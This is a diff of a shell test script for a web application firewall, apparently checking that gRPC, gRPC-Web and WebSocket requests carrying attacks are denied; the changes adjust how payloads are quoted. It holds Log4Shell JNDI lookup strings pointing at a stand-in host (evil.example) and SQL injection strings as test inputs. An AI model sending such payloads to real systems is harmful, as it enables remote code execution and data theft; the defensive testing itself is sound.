@@ -484,7 +484,7 @@ grpc_denied_by_engine() {
 # (curl, HTTP/1.1) with an attack in its metadata, as "HTTP GRPC".
 grpc_web_status() {
   curl -s -o /dev/null -D - -H "Host: $HOST" -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' \
-    -H 'X-Api-Key: ${jndi:ldap://evil.example/a}' --data-binary "@$work/grpc-empty" \
+    -H "X-Api-Key: \${jndi:ldap://evil.example/a}" --data-binary "@$work/grpc-empty" \
     "http://127.0.0.1:$1/grpc.health.v1.Health/Check" |
     tr -d '\r' | awk 'NR == 1 { code = $2 } tolower($1) == "grpc-status:" { grpc = $2 } END { print code, grpc }' || true
 }
@@ -535,7 +535,7 @@ grpc_message_isnt() {
 }
 GRPC_MESSAGE_ATTACK="1' OR '1'='1' -- "
 # Log4Shell (944150), quoted: not a shell expansion.
-GRPC_ATTACK='x-api-key=${jndi:ldap://evil.example/a}'
+GRPC_ATTACK="x-api-key=\${jndi:ldap://evil.example/a}"
 no_limits() { ! "${KUBECTL[@]}" -n "$NS" get clienttrafficpolicy inkwall-waf-custom inkwall-waf-plain -o name 2>/dev/null | grep . >/dev/null; }
 # The operator's buffer limit, in force on both Gateways.
 limits_accepted() {
@@ -625,7 +625,7 @@ check "a WebSocket from the allowed origin upgrades and echoes" ws_are upgraded 
 check "a WebSocket from another origin gets 403, no upgrade" ws_are 403 /ws "$WS_EVIL"
 check "a WebSocket without an Origin gets 403" ws_are 403 /ws none
 check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27%20OR%20%271%27%3D%271"
-check "a WebSocket with an attack in a header gets 403" ws_are 403 /ws "$WS_ORIGIN" 'Sec-WebSocket-Protocol: ${jndi:ldap://evil.example/a}'
+check "a WebSocket with an attack in a header gets 403" ws_are 403 /ws "$WS_ORIGIN" "Sec-WebSocket-Protocol: \${jndi:ldap://evil.example/a}"
 check "and its client gets the engine's gRPC status, not an HTTP 403" grpc_denied_by_engine "$GRPC_ATTACK"
 check "a gRPC-Web call with an attack in its metadata gets grpc-status 7" grpc_web_denied
 # gRPC messages (#275): read only with body.grpcMessages: Inspect.
